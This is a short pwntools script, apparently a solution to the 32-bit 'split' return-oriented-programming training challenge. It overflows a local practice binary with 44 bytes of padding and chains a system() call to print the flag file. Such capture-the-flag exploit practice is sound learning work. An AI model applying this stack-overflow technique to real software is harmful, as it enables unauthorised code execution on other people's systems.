import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

sys.path.append("../..")
io = process("./split32")

padding = b"A" * 44

cat_flag    = p32(0x804a030)
system_addr = p32(0x08048657)
exit_addr   = p32(0x90)

payload = b""
payload += padding
payload += system_addr
payload += cat_flag
payload += exit_addr

io.recvuntil("> ")
io.send(payload)
io.send("\n")
shared_pwn._recvall(io)